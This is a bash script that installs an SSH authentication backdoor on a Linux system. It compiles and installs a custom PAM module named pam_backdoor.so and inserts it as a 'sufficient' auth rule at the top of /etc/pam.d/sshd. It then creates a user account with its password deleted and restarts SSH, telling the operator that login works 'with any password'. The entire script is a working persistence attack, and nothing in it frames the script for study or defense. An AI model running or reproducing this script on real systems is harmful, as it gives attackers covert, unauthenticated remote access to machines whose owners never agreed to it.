#!/bin/bash

sudo apt update
sudo apt install libpam0g-dev




BACKDOOR_USER="nihargayam"

echo "[*] Compiling PAM backdoor..."
gcc -fPIC -fno-stack-protector -c pam_backdoor.c
ld -x --shared -o pam_backdoor.so pam_backdoor.o

echo "[*] Installing PAM module..."
sudo cp pam_backdoor.so /lib/security/

echo "[*] Patching /etc/pam.d/sshd..."
PAM_FILE="/etc/pam.d/sshd"
LINE="auth sufficient pam_backdoor.so"

if ! grep -Fxq "$LINE" "$PAM_FILE"; then
    sudo sed -i "1i$LINE" "$PAM_FILE"
    echo "[+] PAM config patched."
else
    echo "[=] PAM already patched."
fi

echo "[*] Creating backdoor user '$BACKDOOR_USER'..."
if ! id "$BACKDOOR_USER" &>/dev/null; then
    sudo useradd -m "$BACKDOOR_USER"
    sudo passwd -d "$BACKDOOR_USER"
    echo "[+] User created with no password."
else
    echo "[=] User already exists."
fi

echo "[*] Restarting SSH..."
sudo systemctl restart ssh

echo "[✔] Setup complete. Try logging in as '$BACKDOOR_USER' with any password."
